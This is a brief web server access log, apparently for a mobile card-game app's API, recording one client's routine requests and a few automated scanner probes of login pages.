+49.36.50.232,2025-07-07 04:50:39+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:39+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:39+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:40+00:00,GET,/api/cards/play-and-sponsor/,200,286,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:41+00:00,POST,/api/cards/viewed-card/,200,26,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:43+00:00,POST,/api/cards/play-and-sponsor/,200,51,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:43+00:00,GET,/api/cards/check-level/,200,94,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:43+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:44+00:00,GET,/api/cards/play-and-sponsor/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:44+00:00,GET,/api/cards/banner-ads/,200,52,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:44+00:00,GET,/api/user/info/,200,116,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:46+00:00,GET,/api/stats/get-rank/,200,50,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:46+00:00,GET,/api/stats/leaderboard/,200,1739,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+49.36.50.232,2025-07-07 04:50:46+00:00,GET,/api/stats/idiom-stats/,200,216,culturemaxapk/1 CFNetwork/3826.500.131 Darwin/24.5.0
+43.129.169.161,2025-07-07 04:59:53+00:00,HEAD,/Core/Skin/Login.aspx,301,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+43.129.169.161,2025-07-07 04:59:54+00:00,HEAD,/Core/Skin/Login.aspx,404,0,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
+172.202.117.213,2025-07-07 05:08:22+00:00,GET,/owa/auth/logon.aspx,302,154,Mozilla/5.0 zgrab/0.x
